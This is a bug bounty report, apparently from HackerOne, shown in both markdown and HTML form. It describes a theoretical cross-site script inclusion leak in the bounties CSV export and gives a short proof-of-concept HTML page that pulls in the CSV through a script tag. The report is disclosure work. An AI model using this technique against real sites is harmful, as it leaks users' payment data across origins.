    "vulnerability_information": "**Summary:**\nThe function \"**Download as CSV**\" might leak information to 3rd domains. The exploitation seems unlikely and purely theoretical but it might work in some cases. \n\n**Description (Include Impact):**\nTake downloading payments as CSV, for example, which is recently launched. The response to \nhttps://hackerone.com/settings/bounties.csv\nreturns CSV which is indeed, a comma separated values. There is a field which is influenced by user input i.e. report_title.\nAnd, as we all know, `script` inclusions are exempt from SOP. So, if the returned CSV forms valid JavaScript, it's possible that we can read information.\n\n### Steps To Reproduce\nFor demonstration;\nI created an HTML page as follows;\n```html\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset='utf-8'/>\n    <script>\n        var report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status;\n    </script>\n  </head>\n  <body>\n    <script src='https://hackerone.com/settings/bounties.csv'></script>\n  </body>\n</html>\n```\n\nAnd, edited returned response (using BurpSuite) as follows;\n```JavaScript\nreport_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n```\n\nSo, what I did is added ```=` ```  right after first word of first report. Similarly added ``` `//``` right after last word of last report.\nThis makes it a valid JavaScript, and `XSS` a valid variable which now have all details in it. \n\n### Optional: Your Environment (Browser version, Device, etc)\nFirefox version 45.7.0\nUA:  Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nSafari may also work.\n",

The exploitation seems unlikely and purely theoretical but it might work in some cases. </p>\n\n<p><strong>Description (Include Impact):</strong><br>\nTake downloading payments as CSV, for example, which is recently launched. The response to <br>\n<a title=\"https://hackerone.com/settings/bounties.csv\" href=\"https://hackerone.com/settings/bounties.csv\">https://hackerone.com/settings/bounties.csv</a><br>\nreturns CSV which is indeed, a comma separated values. There is a field which is influenced by user input i.e. report_title.<br>\nAnd, as we all know, <code>script</code> inclusions are exempt from SOP. So, if the returned CSV forms valid JavaScript, it&#39;s possible that we can read information.</p>\n\n<h3 id=\"steps-to-reproduce\">Steps To Reproduce</h3>\n\n<p>For demonstration;<br>\nI created an HTML page as follows;</p>\n<pre class=\"highlight html\"><code><span class=\"cp\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n  <span class=\"nt\">&lt;head&gt;</span>\n    <span class=\"nt\">&lt;meta</span> <span class=\"na\">charset=</span><span class=\"s\">&#39;utf-8&#39;</span><span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;script&gt;</span>\n        <span class=\"kd\">var</span> <span class=\"nx\">report_id</span><span class=\"p\">,</span><span class=\"nx\">report_title</span><span class=\"p\">,</span><span class=\"nx\">program_name</span><span class=\"p\">,</span><span class=\"nx\">total_amount</span><span class=\"p\">,</span><span class=\"nx\">amount</span><span class=\"p\">,</span><span class=\"nx\">bonus_amount</span><span class=\"p\">,</span><span class=\"nx\">currency</span><span class=\"p\">,</span><span class=\"nx\">awarded_at</span><span class=\"p\">,</span><span class=\"nx\">status</span><span class=\"p\">;</span>\n    <span class=\"nt\">&lt;/script&gt;</span>\n  <span class=\"nt\">&lt;/head&gt;</span>\n  <span class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;script </span><span class=\"na\">src=</span><span class=\"s\">&#39;https://hackerone.com/settings/bounties.csv&#39;</span><span class=\"nt\">&gt;&lt;/script&gt;</span>\n  <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>And, edited returned response (using BurpSuite) as follows;</p>\n<pre class=\"highlight plaintext\"><code>report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n</code></pre>\n<p>So, what I did is added <code>=`</code>  right after first word of first report. Similarly added <code>`//</code> right after last word of last report.<br>\nThis makes it a valid JavaScript, and <code>XSS</code> a valid variable which now have all details in it. </p>\n\n<h3 id=\"optional-your-environment-browser-version-device-etc\">Optional: Your Environment (Browser version, Device, etc)</h3>\n\n<p>Firefox version 45.7.0<br>\nUA:  Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0<br>\nSafari may also work.</p>\n",
